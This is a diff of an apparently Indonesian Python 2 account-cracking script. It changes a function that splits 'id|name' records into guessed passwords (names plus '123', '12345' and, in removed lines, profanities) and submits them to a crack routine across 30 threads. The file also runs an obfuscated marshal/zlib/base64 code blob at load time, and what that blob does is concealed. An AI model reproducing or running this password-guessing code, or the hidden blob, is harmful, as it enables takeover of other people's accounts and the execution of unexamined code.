@@ -777,50 +777,45 @@ def igg():
 	with ThreadPoolExecutor(max_workers=30) as log:
 		for ro in mi:
 			try:
-				_pantek_ = []
-				_a_ = ro.encode("utf-8")
-				_a_ = _r_.split("|")[0]
-				_n_ = _r_.split("|")[1]
-				_g_ = _m_.split()
+				_bff_ = []
+				_r_ = ro.encode("utf-8")
+				_o_ = _r_.split("|")[0]
+				_m_ = _r_.split("|")[1]
+				_i_ = _m_.split()
 				if len(cr) != 1:
 					if len(_o_) >= 6:
-						_aang_.append(_o_)
+						_bff_.append(_o_)
 						if len(_i_[0]) <= 2:
 							if len(_i_) >= 2:
-								_aang_.append(_i_[0]+_i_[1])
+								_bff_.append(_i_[0]+_i_[1])
 							if len(_m_) >= 6:
-								_aang_.append(_m_)
+								_bff_.append(_m_)
 						else:
-							_aang_.append(_i_[0]+"123")
+							_bff_.append(_i_[0]+"123")
 							if len(_i_) >= 2:
-								_aang_.append(_i_[0]+_i_[1])
+								_bff_.append(_i_[0]+_i_[1])
 							if len(_m_) >= 6:
-								_aang_.append(_m_)
+								_bff_.append(_m_)
 					else:
-						_aang_.append(_o_+_o_)
+						_bff_.append(_o_+_o_)
 						if len(_i_[0]) <= 2:
 							if len(_i_) >= 2:
-								_aang_.append(_i_[0]+_i_[1])
+								_bff_.append(_i_[0]+_i_[1])
 							if len(_m_) >= 6:
-								_aang_.append(_m_)
+								_bff_.append(_m_)
 						else:
 							if len(_i_) >= 2:
-								_aang_.append(_i_[0]+_i_[1])
-							_aang_.append(_i_[0]+"123")
+								_bff_.append(_i_[0]+_i_[1])
+							_bff_.append(_i_[0]+"123")
 							if len(_m_) >= 6:
-								_aang_.append(_m_)
+								_bff_.append(_m_)
 				else:
-					_aang_.append(_i_[0]+"123")
-					_aang_.append(_i_[0]+"anjing")
-					_aang_.append(_i_[0]+"sayang")
-					_aang_.append(_i_[0]+"kontol")
-					_aang_.append(_i_[0]+"bangsat")
-					_aang_.append(_i_[0]+"bismillah")
-					_aang_.append(_i_[0]+"12345")
-					_aang_.append(_o_)
-				log.submit(crack2, _o_, _aang_)
+					_bff_.append(_i_[0]+"123")
+					_bff_.append(_i_[0]+"12345")
+					_bff_.append(_o_)
+				log.submit(crack2, _o_, _bff_)
 			except: pass
-	exit("%s╚══[•] Crack selesai sayang hehe"%(H))
+	exit("%s╚═[•] Crack selesai sayang..."%(H))
 _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
       
 if __name__ == '__main__':
